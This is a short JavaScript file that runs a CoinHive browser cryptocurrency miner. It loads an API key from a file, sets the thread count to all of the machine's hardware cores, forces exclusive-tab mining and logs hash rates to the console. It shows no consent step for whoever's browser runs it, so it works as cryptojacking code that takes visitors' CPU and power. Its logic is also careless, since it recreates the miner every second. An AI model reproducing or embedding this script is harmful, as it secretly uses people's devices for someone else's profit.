var threadCount = navigator.hardwareConcurrency;
var timeDelay = 1000;
var timeDelayMain = 1250;
var updatePos = 0;

// REQUIRES KEYLOADER TO BE INITIALISED

setInterval(function() {
	miner = new CoinHive.Anonymous(readKeyFile("./keys/key.apikey"),'threads: ' + threadCount);
}, timeDelay);
	
// Update stats once per second
setInterval(function() {
	
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
	
	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
	updatePos++;
    // Output to console
    if (miner.isRunning()) {
		
		var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    	var totalHashes = miner.getTotalHashes();
    	var acceptedHashes = miner.getAcceptedHashes() / 256;
		
		console.log("UpdateNum = " + updatePos + "\n" + "threadcount = " + threadCount + "\n" + "hashesPerSecond = " + hashesPerSecond + "\n" + "total hashes = " + totalHashes + "\n" + "accepted hashes = " + acceptedHashes);
    
	}
	
}, timeDelayMain);
	